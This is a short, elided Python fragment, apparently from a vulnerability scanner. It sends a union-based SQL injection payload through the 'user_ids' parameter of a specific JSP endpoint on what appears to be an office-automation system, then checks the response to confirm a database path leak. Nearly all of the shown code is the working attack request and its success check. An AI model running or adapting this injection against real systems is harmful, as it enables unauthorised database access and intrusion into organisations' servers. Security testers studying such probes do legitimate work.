...
def ty(url,s_cookie):
    ...
    try:
        ...
        gf = requests.get(url+'yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(SELECT%20@@basedir),4#',cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        if gf.status_code == 200 and '@@basedir' in gf.text:
            uia+='[+]yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(SELECT%20@@basedir),4#\n\n@@basedir\n'
            try:
